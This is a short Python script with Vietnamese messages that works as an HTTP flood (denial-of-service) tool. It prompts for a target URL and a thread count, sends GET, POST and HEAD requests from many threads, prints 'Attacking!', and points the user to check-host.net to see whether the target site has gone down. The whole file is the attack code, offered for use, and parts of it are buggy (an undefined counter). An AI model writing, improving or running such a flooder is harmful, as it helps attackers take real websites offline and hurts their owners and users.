import time
import requests
import threading
import os
from termcolor import colored
from colorama import init, Fore, Back, Style
os.system("clear")
url=input('URL:')
thread=int(input('Thread:'))
os.system("clear")
print('Đang tấn công! Truy cập vào: https://check-host.net/check-http?host='+url)
print('https://check-host.net/check-http?host='+url)
print('để kiểm tra trạng thái web.')
def request_10000_async():
    start = time.perf_counter()
    client = requests.Session()

 
    	
    def request(secret_number):
        client.get(url.format(secret_number), timeout=10000)
        client.post(url.format(secret_number), timeout=10000)
        client.head(url.format(secret_number), timeout=10000)
        requests.get(url.format(secret_number), timeout=10000)
        dem=dem+1
        print('requets đã gửi:',dem)
    
     


    tasks = []
    for secret in range(thread):
        # Tạo thread và khởi động chúng
        task = threading.Thread(target=request, args=(secret,))       
        task.start()
        tasks.append(task)
        
    
    # Đợi tất cả thread thực thi xong
    
request_10000_async()
